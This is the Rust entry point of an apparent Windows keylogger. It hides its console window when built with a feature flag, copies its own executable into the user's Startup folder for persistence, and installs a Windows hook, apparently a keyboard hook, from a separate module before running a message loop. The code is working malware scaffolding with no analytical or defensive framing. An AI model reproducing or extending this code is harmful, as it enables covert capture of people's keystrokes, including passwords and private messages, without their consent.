#![cfg_attr(all(windows, feature = "no_console"), windows_subsystem = "windows")]
#![allow(non_upper_case_globals)]
#![allow(non_snake_case)]

use std::{
    io, env, fs, 
    path::Path,
    mem::zeroed
};
use windows::{
    core::PCWSTR,
    Win32::Foundation::HWND,
    Win32::System::LibraryLoader::GetModuleHandleW,
    Win32::UI::WindowsAndMessaging::{DispatchMessageW, GetMessageW, MSG, TranslateMessage, UnhookWindowsHookEx},
};

mod keys;
mod hook;

fn add_to_startup() -> io::Result<()> {
    let exe = env::current_exe()?;
    let file_name = exe.file_name().unwrap();

    let startup_path = format!(
        "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        env::var("USERNAME").expect("Error getting username")
    );

    let path = Path::new(&startup_path).join(file_name);
    
    if !path.exists() {
        fs::copy(&exe, &path)?;
    }

    Ok(())
}

fn main() {
    if let Err(e) = add_to_startup() {
        eprintln!("Failed to add to startup: {}", e);
    }

    unsafe {
        let hinst = GetModuleHandleW(PCWSTR::null()).unwrap();
        let hook = hook::load_hook(hinst).expect("Failed to install hook");

        if hook.0.is_null() {
            panic!("SetWindowsHookExW returned NULL");
        }

        let mut msg: MSG = zeroed();
        while GetMessageW(&mut msg, Some(HWND::default()), 0, 0) != false {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        UnhookWindowsHookEx(hook);
    }
}

